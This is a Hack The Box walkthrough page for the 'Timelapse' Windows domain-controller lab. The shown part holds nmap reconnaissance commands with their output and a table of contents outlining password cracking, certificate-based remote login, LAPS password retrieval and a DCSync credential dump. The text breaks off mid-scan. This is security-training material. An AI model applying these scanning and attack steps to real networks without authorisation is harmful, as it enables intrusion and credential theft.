<!DOCTYPE html>
<html lang="en-us">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    
    <meta name="generator" content="Hugo 0.138.0">

    <script src="js/custom.js"></script>
    

    

    
        
            <meta
                name="description"
                content="Bones &amp; All Cyber Security" />
        

        
            <meta
                name="keywords"
                content="hacking, AD, hack the box, HTB, security, pentesting, cybersecurity, pentester, active-directory" />
        

        
            <meta name="author" content="bloodstiller" />
        

    


    <title>
        
            Timelapse HTB Walkthrough |
            Hack the planet
        
    </title>

    


    
    

    
    


    
    


    
    


    
    

    


    
    

    

    

        
            
            <link
                rel="stylesheet"
                href="/reset.min_6107201571472815285.3662e40c85350bf0bcf308b7db81c173e4b690b862d3c3cde460de5155550bf055b7ff48cddb1cf5255e55f0355196d8dec1d49434b2457842cc77ebea198f3f.css"
                integrity="sha512-NmLkDIU1C/C88wi324HBc&#43;S2kLhi08PN5GDeUVVVC/BVt/9Izdsc9SVeVfA1UZbY3sHUlDSyRXhCzHfr6hmPPw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/01_layout.5974c097ff194e0a64d31c28fc478cc38b6290fe28d2cc2dbf5ae52a66751db74e4e7374bc4e25f464ea679f74cd86c474a5367e05c2db34a1b9b273466691e0.css"
                integrity="sha512-WXTAl/8ZTgpk0xwo/EeMw4tikP4o0swtv1rlKmZ1HbdOTnN0vE4l9GTqZ590zYbEdKU2fgXC2zShubJzRmaR4A==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/02_style.8484c853cc558c1c2189842f955ad4be9bf66854698f03f140aef3cfc23174c78eb1ab05b915b7877afac7464e5d70d467c87c1fb3fcbe11a75d379de01e0798.css"
                integrity="sha512-hITIU8xVjBwhiYQvlVrUvpv2aFRpjwPxQK7zz8IxdMeOsasFuRW3h3r6x0ZOXXDUZ8h8H7P8vhGnXTed4B4HmA==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/03_home.6d64455a82e28b01e58f3c37541add9e36fc8ed87562dac91ff06da3f7f11b32ac1cacaa593b2ab2e01acd894659f66c249bd0a261f051038f19a8734c3e1243.css"
                integrity="sha512-bWRFWoLiiwHljzw3VBrdnjb8jth1YtrJH/Bto/fxGzKsHKyqWTsqsuAazYlGWfZsJJvQomHwUQOPGahzTD4SQw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/04_responsive.065451199c1e1cd4f86ac1c8733e3c77eaf215b4972cefff7e7929a2837f5b2cc0e0a04f99f34d58e082812d6102c8cc9b358d21db784e9c4d5e5a8c79f4bc43.css"
                integrity="sha512-BlRRGZweHNT4asHIcz48d&#43;ryFbSXLO//fnkpooN/WyzA4KBPmfNNWOCCgS1hAsjMmzWNIdt4TpxNXlqMefS8Qw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/05_markdown.9afaac6b0a75a2cd9086fb9684dfae53bd04b90e034a252e123a9822c3fa6a5c8a3f88211159b1bd0c6918d19ed7bf3e929ff12de51d06fab0eea77e2374f967.css"
                integrity="sha512-mvqsawp1os2QhvuWhN&#43;uU70EuQ4DSiUuEjqYIsP6alyKP4ghEVmxvQxpGNGe178&#43;kp/xLeUdBvqw7qd&#43;I3T5Zw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/06_image.ee39fc51345f4c74b8c491bde29d5b2053688d0cc6e937f5660e0f5e3665212473f4cb408cd1749317343308aa41ef1baca3ec3f3aff986ab3764c822790008f.css"
                integrity="sha512-7jn8UTRfTHS4xJG94p1bIFNojQzG6Tf1Zg4PXjZlISRz9MtAjNF0kxc0MwiqQe8brKPsPzr/mGqzdkyCJ5AAjw==" />
        

    


    
    

    

    

    

    


</head>



    <body>
        <header class="header">
    <div class="header_left">
        
    </div>

    <div class="header_middle">
        
            Timelapse HTB Walkthrough -
            Hack the planet
        
    </div>
</header>



        <main>
            <aside class="sidebar">
    



    
    

    
    


    <ul class="section-tree">
        
            
                <li
                    
                        class="dir closed-dir"
                    >
                    <span class="dir-text"> Articles </span>

                    



    
    

    
    


    <ul class="section-tree">
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/understandingdownloadcradles/" title="./articles/understandingdownloadcradles/">
                        
                            Understanding PowerShell Download Cradles: A Deep Dive
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/understanding2023-28252-clfs/" title="./articles/understanding2023-28252-clfs/">
                        
                            Understanding CVE-2023-28252: Deep Dive into the CLFS Privilege Escalation Vulnerability
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/understandingthemebleedcve-2023-38146/" title="./articles/understandingthemebleedcve-2023-38146/">
                        
                            Understanding CVE-2023-38146: Deep Dive into the ThemeBleed Vulnerability
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/understandingcupsexploitation/" title="./articles/understandingcupsexploitation/">
                        
                            Understanding the CUPS Exploit Chain: A Deep Dive into CVE-2024-4176, CVE-2024-4175, CVE-2024-4177 and CVE-2024-4076
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/understandingnopacexploit/" title="./articles/understandingnopacexploit/">
                        
                            Understanding the NoPac Exploit: A Deep Dive into CVE-2021-42278 and CVE-2021-42287
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/seloaddriverprivilegeescalation/" title="./articles/seloaddriverprivilegeescalation/">
                        
                            Understanding SeLoadDriverPrivilege Escalation: A Deep Dive
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/azureadconnectattack/" title="./articles/azureadconnectattack/">
                        
                            Understanding Azure AD Connect Exploitation &amp; Privilege Escalation
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/shadowcredentialsattack/" title="./articles/shadowcredentialsattack/">
                        
                            Understanding the Shadow Credentials Attack Vector
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/deserializationattacksexplained/" title="./articles/deserializationattacksexplained/">
                        
                            Understanding .NET Deserialization Exploits: A Deep Dive
                        
                    </a>
                </li>
            
        
    </ul>


                </li>
            
        
            
                <li
                    
                        class="dir opened-dir"
                    >
                    <span class="dir-text"> Walkthroughs </span>

                    



    
    

    
    


    <ul class="section-tree">
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/timelapse-box/" title="./walkthroughs/timelapse-box/">
                        
                            Timelapse HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/certified-box/" title="./walkthroughs/certified-box/">
                        
                            Certified HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/aero-box/" title="./walkthroughs/aero-box/">
                        
                            Aero HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/administrator-box/" title="./walkthroughs/administrator-box/">
                        
                            Administrator HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/sauna-box/" title="./walkthroughs/sauna-box/">
                        
                            Sauna HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/active-box/" title="./walkthroughs/active-box/">
                        
                            Active HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/cicada-box/" title="./walkthroughs/cicada-box/">
                        
                            Cicada HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/authority-box/" title="./walkthroughs/authority-box/">
                        
                            Authority HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/evilcups-box/" title="./walkthroughs/evilcups-box/">
                        
                            EvilCUPS HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/resolute-box/" title="./walkthroughs/resolute-box/">
                        
                            Resolute HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/fuse-box/" title="./walkthroughs/fuse-box/">
                        
                            Fuse HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/cascade-box/" title="./walkthroughs/cascade-box/">
                        
                            Cascade HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/monteverde-box/" title="./walkthroughs/monteverde-box/">
                        
                            Monteverde HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/outdated-box/" title="./walkthroughs/outdated-box/">
                        
                            Outdated HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/scrambled-box/" title="./walkthroughs/scrambled-box/">
                        
                            Scrambled HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/escape-box/" title="./walkthroughs/escape-box/">
                        
                            Escape HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/hospital-box/" title="./walkthroughs/hospital-box/">
                        
                            Hospital HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/intelligence-box/" title="./walkthroughs/intelligence-box/">
                        
                            Intelligence HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/manager-box/" title="./walkthroughs/manager-box/">
                        
                            Manager HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/access-box/" title="./walkthroughs/access-box/">
                        
                            Access HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/remote-box/" title="./walkthroughs/remote-box/">
                        
                            Remote HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/support-box/" title="./walkthroughs/support-box/">
                        
                            Support HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/return-box/" title="./walkthroughs/return-box/">
                        
                            Return HTB Walkthrough
                        
                    </a>
                </li>
            
        
    </ul>


                </li>
            
        
            
                <li
                    
                        class="dir closed-dir"
                    >
                    <span class="dir-text"> Tools </span>

                    



    
    

    
    


    <ul class="section-tree">
        
            
                <li class="file">
                    <a href="http://localhost:1313/tools/automatingqemukalivm/" title="./tools/automatingqemukalivm/">
                        
                            Automating Kali VM Setup with QEMU
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/tools/bloodserver/" title="./tools/bloodserver/">
                        
                            BloodServer: A Secure File Transfer Tool for Penetration Testers
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/tools/ldapire/" title="./tools/ldapire/">
                        
                            LDAPire: LDAP Enumeration Tool
                        
                    </a>
                </li>
            
        
    </ul>


                </li>
            
        
            
                <li
                    
                        class="dir closed-dir"
                    >
                    <span class="dir-text"> Cheatsheets </span>

                    



    
    

    
    


    <ul class="section-tree">
        
            
                <li class="file">
                    <a href="http://localhost:1313/cheatsheets/ldap-cheatsheet/" title="./cheatsheets/ldap-cheatsheet/">
                        
                            Attacking LDAP: Deep Dive &amp; Cheatsheet
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/cheatsheets/rpc-cheatsheet/" title="./cheatsheets/rpc-cheatsheet/">
                        
                            Attacking RPC: Deep Dive &amp; Cheat Sheet
                        
                    </a>
                </li>
            
        
    </ul>


                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/driver-box/" title="./driver-box/">
                        
                            Driver HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/aboutme/" title="./aboutme/">
                        
                            about me
                        
                    </a>
                </li>
            
        
    </ul>


</aside>
<aside class="exapandable"></aside>


            
    <article class="main">
        <button
    class="sidebar-toggle-btn"
    type="menu"
    aria-expanded="false"
    aria-haspopup="true">
    <i class="bi bi-list"></i>
</button>



        <div class="title">
            <h1 class="title-header">
                Timelapse HTB Walkthrough
            </h1>

            <div class="author-date-readtime">
                

                    
                        <div class="author" title="Author">
                            <i class="bi bi-person"></i>
                            <a
                                href="/author/bloodstiller/"
                                class="cat-btn">
                                bloodstiller
                            </a>
                        </div>
                    

                

                
                    <div class="date" title="Date">
                        <i class="bi bi-calendar3"></i>
                        <time
                            datetime="2024.11.11"
                            >2024.11.11
                        </time>
                    </div>
                

                
                    <div
                        class="readtime"
                        title="Time to Read">
                        <i class="bi bi-clock"></i>
                        14 mins to read
                    </div>
                
            </div>
        </div>

        <div class="article-meta">
            

            
                <div class="tags">
                    <i
                        class="bi bi-tags"
                        title="Tags"></i>
                    
                        <a
                            href="/tags/box/"
                            class="tag-btn">
                            Box
                        </a>
                    
                        <a
                            href="/tags/htb/"
                            class="tag-btn">
                            HTB
                        </a>
                    
                        <a
                            href="/tags/easy/"
                            class="tag-btn">
                            Easy
                        </a>
                    
                        <a
                            href="/tags/windows/"
                            class="tag-btn">
                            Windows
                        </a>
                    
                        <a
                            href="/tags/ldap/"
                            class="tag-btn">
                            LDAP
                        </a>
                    
                        <a
                            href="/tags/active-directory/"
                            class="tag-btn">
                            Active Directory
                        </a>
                    
                        <a
                            href="/tags/laps/"
                            class="tag-btn">
                            LAPS
                        </a>
                    
                        <a
                            href="/tags/pfx/"
                            class="tag-btn">
                            pfx
                        </a>
                    
                        <a
                            href="/tags/john/"
                            class="tag-btn">
                            john
                        </a>
                    
                </div>
            

            
                <div class="breadcumb">
                    <i class="bi bi-folder"></i>
                    
    
    




<a href="http://localhost:1313/" class="bread-btn">
    
        <i class="bi bi-house-fill"></i>
    

    
        Home
    
</a>




    /



<a href="http://localhost:1313/walkthroughs/" class="bread-btn">
    

    
        Walkthroughs
    
</a>




    /



<a href="http://localhost:1313/walkthroughs/timelapse-box/" class="bread-btn">
    

    
        
            Timelapse HTB Walkthrough
        

    
</a>

                </div>
            

            
        </div>

        
            <nav id="TableOfContents">
  <ul>
    <li><a href="#timelapse-hack-the-box-walkthrough-writeup">Timelapse Hack The Box Walkthrough/Writeup:</a></li>
    <li><a href="#how-i-use-variables-and-wordlists">How I use variables &amp; Wordlists:</a></li>
    <li><a href="#1-dot-enumeration">1. Enumeration:</a>
      <ul>
        <li><a href="#nmap">NMAP:</a></li>
        <li><a href="#ldap-389">LDAP <code>389</code>:</a></li>
        <li><a href="#dns-53">DNS <code>53</code>:</a></li>
        <li><a href="#kerberos-88">Kerberos <code>88</code>:</a></li>
        <li><a href="#smb-445">SMB <code>445</code>:</a></li>
        <li><a href="#using-smbclient-to-enumerate-shares">Using smbclient to enumerate shares:</a></li>
        <li><a href="#finding-laps-related-documentation-on-in-the-helpdesk-share">Finding LAPS related documentation on in the HelpDesk share:</a></li>
      </ul>
    </li>
    <li><a href="#2-dot-foothold">2. Foothold:</a>
      <ul>
        <li><a href="#finding-a-backup-in-the-dev-share">Finding a backup in the Dev share:</a></li>
        <li><a href="#cracking-the-encrypted-zip-file-using-zip2john-and-john">Cracking the encrypted zip file using zip2john &amp; john:</a></li>
        <li><a href="#attempting-to-extract-the-private-keys-from-the-dot-pfx">Attempting to extract the private keys from the <code>.pfx</code>:</a></li>
        <li><a href="#cracking-the-dot-pfx-using-pfx2john-and-john">Cracking the <code>.pfx</code> using pfx2john &amp; john:</a></li>
        <li><a href="#extracting-the-private-key-and-certificate-with-openssl-from-a-dot-pfx">Extracting the private key &amp; certificate with openssl from a <code>.pfx</code>:</a></li>
        <li><a href="#connecting-with-evil-winrm-to-the-host-using-certificates">Connecting with evil-winrm to the host using certificates:</a></li>
      </ul>
    </li>
    <li><a href="#3-dot-privilege-escalation">3. Privilege Escalation:</a>
      <ul>
        <li><a href="#general-enumeration">General Enumeration:</a></li>
        <li><a href="#checking-powershell-history">Checking PowerShell history:</a></li>
        <li><a href="#finding-clear-text-credentials-in-the-powershell-history-file">Finding clear text credentials in the PowerShell history file:</a></li>
        <li><a href="#performing-a-bloodhound-collection">Performing a bloodhound collection:</a></li>
        <li><a href="#finding-out-svc-deploy-has-readlapspassword-privileges-over-the-dc">Finding out svc_deploy has ReadLAPSPassword privileges over the DC:</a></li>
        <li><a href="#retrieving-dc01-laps-password-with-powerview-via-download-cradle">Retrieving DC01 LAPS Password with PowerView via download cradle:</a></li>
      </ul>
    </li>
    <li><a href="#4-dot-persistence">4. Persistence:</a>
      <ul>
        <li><a href="#dumping-ntds-dot-dit-dc-sync-attack">Dumping NTDS.dit/DC-SYNC attack:</a></li>
      </ul>
    </li>
    <li><a href="#lessons-learned">Lessons Learned:</a>
      <ul>
        <li><a href="#what-did-i-learn">What did I learn?</a></li>
        <li><a href="#what-silly-mistakes-did-i-make">What silly mistakes did I make?</a></li>
      </ul>
    </li>
    <li><a href="#sign-off">Sign off:</a></li>
  </ul>
</nav>
        


        <div class="content">
            
                <h2 id="timelapse-hack-the-box-walkthrough-writeup">Timelapse Hack The Box Walkthrough/Writeup:</h2>
<ul>
<li><a href="https://app.hackthebox.com/machines/Timelapse">https://app.hackthebox.com/machines/Timelapse</a></li>
</ul>
<h2 id="how-i-use-variables-and-wordlists">How I use variables &amp; Wordlists:</h2>
<ul>
<li>
<p><strong>Variables</strong>:</p>
<ul>
<li>In my commands you are going to see me use <code>$box</code>, <code>$user</code>, <code>$hash</code>, <code>$domain</code>, <code>$pass</code> often.
<ul>
<li>I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
<ul>
<li><code>$box</code> = The IP of the box</li>
<li><code>$pass</code> = Passwords I have access to.</li>
<li><code>$user</code> = current user I am enumerating with.
<ul>
<li>Depending on where I am in the process this can change if I move laterally.</li>
</ul>
</li>
<li><code>$domain</code> = the domain name e.g. <code>sugarape.local</code> or <code>contoso.local</code></li>
<li><code>$machine</code> = the machine name e.g. <code>DC01</code></li>
</ul>
</li>
<li>Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Wordlists</strong>:</p>
<ul>
<li>I have symlinks all setup so I can get to my passwords from <code>~/Wordlists</code> so if you see me using that path that&rsquo;s why. If you are on Kali and following on, you will need to go to <code>/usr/share/wordlists</code>
<ul>
<li>I also use these additional wordlists:
<ul>
<li><a href="https://github.com/insidetrust/statistically-likely-usernames">Statistically-likely-usernames</a></li>
<li><a href="https://github.com/danielmiessler/SecLists">SecLists</a></li>
<li><a href="https://github.com/carlospolop/Auto_Wordlists">Auto_Wordlists</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="1-dot-enumeration">1. Enumeration:</h2>
<h3 id="nmap">NMAP:</h3>
<h4 id="basic-scans">Basic Scans:</h4>
<ul>
<li><strong>Basic TCP Scan</strong>:
<ul>
<li><code>nmap $box -Pn -oA TCPbasicScan</code>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="kali%20in%20HTB/BlogEntriesMade/Timelapse/scans/nmap%20%20%f0%9f%8d%a3%20main%20%203GiB/7GiB%20%7c%20268kiB/1GiB%20with%20/usr/bin/zsh%0a%f0%9f%95%99%2022:16:09%20zsh%20%e2%9d%af%20nmap%20$box%20-Pn%20-oA%20TCPbasicScan%0aStarting%20Nmap%207.94SVN%20%28%20https://nmap.org%20%29%20at%202024-11-10%2022:16%20GMT%0aNmap%20scan%20report%20for%2010.129.227.113%0aHost%20is%20up%20%280.040s%20latency%29.%0aNot%20shown:%20991%20filtered%20tcp%20ports%20%28no-response%29%0aPORT%20%20%20%20%20STATE%20SERVICE%0a53/tcp%20%20%20open%20%20domain%0a88/tcp%20%20%20open%20%20kerberos-sec%0a135/tcp%20%20open%20%20msrpc%0a139/tcp%20%20open%20%20netbios-ssn%0a389/tcp%20%20open%20%20ldap%0a445/tcp%20%20open%20%20microsoft-ds%0a593/tcp%20%20open%20%20http-rpc-epmap%0a3268/tcp%20open%20%20globalcatLDAP%0a3269/tcp%20open%20%20globalcatLDAPssl%0a%0aNmap%20done:%201%20IP%20address%20%281%20host%20up%29%20scanned%20in%204.41%20seconds">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali in HTB/BlogEntriesMade/Timelapse/scans/nmap  üç£ main  3GiB/7GiB | 268kiB/1GiB with /usr/bin/zsh
</span></span><span style="display:flex;"><span>üïô 22:16:09 zsh ‚ùØ nmap $box -Pn -oA TCPbasicScan
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-11-10 22:16 GMT
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.227.113
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.040s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">991</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
</span></span><span style="display:flex;"><span>53/tcp   open  domain
</span></span><span style="display:flex;"><span>88/tcp   open  kerberos-sec
</span></span><span style="display:flex;"><span>135/tcp  open  msrpc
</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn
</span></span><span style="display:flex;"><span>389/tcp  open  ldap
</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds
</span></span><span style="display:flex;"><span>593/tcp  open  http-rpc-epmap
</span></span><span style="display:flex;"><span>3268/tcp open  globalcatLDAP
</span></span><span style="display:flex;"><span>3269/tcp open  globalcatLDAPssl
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 4.41 seconds</span></span></code></pre></div>
    
</div>
</li>
<li><strong>Initial thoughts</strong>:
<ul>
<li>DNS</li>
<li>Kerberos</li>
<li>SMB</li>
<li>LDAP</li>
<li>RPC</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="comprehensive-scans">Comprehensive Scans:</h4>
<ul>
<li>
<p><strong>In depth scan TCP</strong>:</p>
<ul>
<li><code>sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP</code></li>
</ul>
<!-- raw HTML omitted -->







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="kali%20in%20content-org/Walkthroughs/HTB/BlogEntriesMade/Timelapse%20%20%f0%9f%8d%a3%20main%20%201GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%f0%9f%95%99%2022:22:24%20zsh%20%e2%9d%af%20sudo%20nmap%20-p-%20-sV%20-sC%20-O%20-Pn%20--disable-arp-ping%20$box%20-oA%20FullTCP%0aStarting%20Nmap%207.94SVN%20%28%20https://nmap.org%20%29%20at%202024-11-11%2006:14%20GMT%0aStats:%200:02:03%20elapsed;%200%20hosts%20completed%20%281%20up%29,%201%20undergoing%20SYN%20Stealth%20Scan%0aSYN%20Stealth%20Scan%20Timing:%20About%2077.90%25%20done;%20ETC:%2006:17%20%280:00:35%20remaining%29%0aStats:%200:02:48%20elapsed;%200%20hosts%20completed%20%281%20up%29,%201%20undergoing%20Service%20Scan%0aService%20scan%20Timing:%20About%2011.76%25%20done;%20ETC:%2006:18%20%280:00:45%20remaining%29%0aNmap%20scan%20report%20for%2010.129.123.90%0aHost%20is%20up%20%280.039s%20latency%29.%0aNot%20shown:%2065518%20filtered%20tcp%20ports%20%28no-response%29%0aPORT%20%20%20%20%20%20STATE%20SERVICE%20%20%20%20%20%20%20%20%20%20%20VERSION%0a53/tcp%20%20%20%20open%20%20domain%20%20%20%20%20%20%20%20%20%20%20%20Simple%20DNS%20Plus%0a88/tcp%20%20%20%20open%20%20kerberos-sec%20%20%20%20%20%20Microsoft%20Windows%20Kerberos%20%28server%20time:%202024-11-11%2014:17:46Z%29%0a135/tcp%20%20%20open%20%20msrpc%20%20%20%20%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a139/tcp%20%20%20open%20%20netbios-ssn%20%20%20%20%20%20%20Microsoft%20Windows%20netbios-ssn%0a389/tcp%20%20%20open%20%20ldap%20%20%20%20%20%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20Active%20Directory%20LDAP%20%28Domain:%20timelapse.htb0.,%20Site:%20Default-First-Site-Name%29%0a445/tcp%20%20%20open%20%20microsoft-ds?%0a593/tcp%20%20%20open%20%20ncacn_http%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%20over%20HTTP%201.0%0a636/tcp%20%20%20open%20%20ldapssl?%0a3268/tcp%20%20open%20%20ldap%20%20%20%20%20%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20Active%20Directory%20LDAP%20%28Domain:%20timelapse.htb0.,%20Site:%20Default-First-Site-Name%29%0a3269/tcp%20%20open%20%20globalcatLDAPssl?%0a5986/tcp%20%20open%20%20ssl/http%20%20%20%20%20%20%20%20%20%20Microsoft%20HTTPAPI%20httpd%202.0%20%28SSDP/UPnP%29%0a%7c_ssl-date:%202024-11-11T14:19:20&#43;00:00;%20&#43;8h00m00s%20from%20scanner%20time.%0a%7c%20ssl-cert:%20Subject:%20commonName=dc01.timelapse.htb%0a%7c%20Not%20valid%20before:%202021-10-25T14:05:29%0a%7c_Not%20valid%20after:%20%202022-10-25T14:25:29%0a%7c%20tls-alpn:%0a%7c_%20%20http/1.1%0a%7c_http-server-header:%20Microsoft-HTTPAPI/2.0%0a%7c_http-title:%20Not%20Found%0a9389/tcp%20%20open%20%20mc-nmf%20%20%20%20%20%20%20%20%20%20%20%20.NET%20Message%20Framing%0a49667/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a49673/tcp%20open%20%20ncacn_http%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%20over%20HTTP%201.0%0a49674/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a49695/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a49724/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0aWarning:%20OSScan%20results%20may%20be%20unreliable%20because%20we%20could%20not%20find%20at%20least%201%20open%20and%201%20closed%20port%0aDevice%20type:%20general%20purpose%0aRunning%20%28JUST%20GUESSING%29:%20Microsoft%20Windows%202019%20%2889%25%29%0aAggressive%20OS%20guesses:%20Microsoft%20Windows%20Server%202019%20%2889%25%29%0aNo%20exact%20OS%20matches%20for%20host%20%28test%20conditions%20non-ideal%29.%0aService%20Info:%20Host:%20DC01;%20OS:%20Windows;%20CPE:%20cpe:/o:microsoft:windows%0a%0aHost%20script%20results:%0a%7c_clock-skew:%20mean:%207h59m59s,%20deviation:%200s,%20median:%207h59m59s%0a%7c%20smb2-security-mode:%0a%7c%20%20%203:1:1:%0a%7c_%20%20%20%20Message%20signing%20enabled%20and%20required%0a%7c%20smb2-time:%0a%7c%20%20%20date:%202024-11-11T14:18:40%0a%7c_%20%20start_date:%20N/A%0a%0aOS%20and%20Service%20detection%20performed.%20Please%20report%20any%20incorrect%20results%20at%20https://nmap.org/submit/%20.%0aNmap%20done:%201%20IP%20address%20%281%20host%20up%29%20scanned%20in%20262.82%20seconds">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali in content-org/Walkthroughs/HTB/BlogEntriesMade/Timelapse  üç£ main  1GiB/7GiB | 0B/1GiB with /usr/bin/zsh
</span></span><span style="display:flex;"><span>üïô 22:22:24 zsh ‚ùØ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-11-11 06:14 GMT
</span></span><span style="display:flex;"><span>Stats: 0:02:03 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing SYN Stealth Scan
</span></span><span style="display:flex;"><span>SYN Stealth Scan Timing: About 77.90% <span style="color:#66d9ef">done</span>; ETC: 06:17 <span style="color:#f92672">(</span>0:00:35 remaining<span style="color:#f92672">)</span>
